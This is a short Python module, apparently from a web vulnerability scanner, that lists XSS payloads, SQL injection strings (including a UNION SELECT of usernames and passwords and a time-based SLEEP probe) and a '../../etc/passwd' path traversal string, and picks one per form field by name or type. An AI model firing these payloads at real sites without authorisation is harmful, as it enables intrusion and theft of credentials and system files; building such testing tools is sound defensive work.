XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS 3')>",
    "<ScRiPt>alert('XSS 4')</ScRiPt>",
    "&#60;script&#62;alert('XSS 5')&#60;/script&#62;",
    "<div onmouseover=alert('XSS 6')>Survole moi</div>",
    "<a href=javascript:alert('XSS 7')>Clique ici</a>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' UNION SELECT NULL--",
    "admin'--",
    "1 OR 1=1",
    "' UNION SELECT username, password FROM users --",
    "' AND 1=1 --",
    "' AND SLEEP(5) --",
    "\" OR \"1\"=\"1",
    "%27%20OR%20%271%27%3D%271",
]

OTHER_PAYLOADS = [
    "../../etc/passwd",
]


def choose_payload(field_name: str, field_type: str) -> str:
    if not field_name and not field_type:
        return ""
    n = (field_name or "").lower()
    t = (field_type or "").lower()

    if any(k in n for k in ("id", "user", "name", "email")):
        return SQLI_PAYLOADS[0]
    if any(k in n for k in ("q", "search", "query", "term")):
        return XSS_PAYLOADS[0]
    if t in ("hidden", "text", "search", "email", "url"):
        return XSS_PAYLOADS[0]
    return ""
